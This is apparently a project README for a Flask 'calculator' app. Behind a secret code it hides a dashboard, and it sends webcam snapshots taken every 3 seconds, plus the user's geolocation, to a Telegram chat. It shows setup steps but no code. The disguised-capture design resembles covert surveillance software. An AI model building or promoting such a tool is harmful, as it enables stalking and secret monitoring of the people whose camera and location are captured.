# Cyberpunk Calculator with Image Capture and Telegram Integration

## Project Description
This project is a Flask-based web application that features a calculator with a hidden dashboard. The calculator allows basic arithmetic operations. When a secret code is entered, a hidden dashboard is revealed that displays images captured from the user's webcam. The app captures webcam images every few seconds, overlays a timestamp and a "Cyberpunk" tag, and sends these images along with the user's geolocation to a Telegram chat using the Telegram Bot API.

## Features
- Basic calculator with addition, subtraction, multiplication, and division.
- Secret code to reveal a hidden dashboard.
- Webcam image capture every 3 seconds with timestamp and tag overlay.
- Geolocation capture with high accuracy.
- Sends captured images and location data to a Telegram chat.
- Dashboard to view captured images and their metadata (timestamp and location).

## Setup Instructions
1. Clone the repository.
2. Install dependencies:
   ```bash
   pip install flask python-dotenv requests
   ```
3. Create a `.env` file in the project root with the following variables:
   ```
   TELEGRAM_TOKEN=your_telegram_bot_token
   CHAT_ID=your_telegram_chat_id
   ```
4. Run the Flask app:
   ```bash
   python app.py
   ```
5. Open your browser and navigate to `http://localhost:5000`.

## Usage
- Use the calculator interface to perform basic calculations.
- Enter the secret code `38448674=` to reveal the hidden dashboard.
- Allow the browser to access your camera and location when prompted.
- The app will automatically capture images from your webcam every 3 seconds, overlay the timestamp and "Cyberpunk" tag, and send them to the configured Telegram chat.
- View captured images and their details in the dashboard.

## Notes
- Ensure your Telegram bot token and chat ID are correctly set in the `.env` file.
- The dashboard images feature requires a backend endpoint `/dashboard_images` to serve captured images, which is not implemented in the current version.
- The app requests access to your camera, microphone, and location for full functionality.

## License
This project is provided as-is without any warranty.
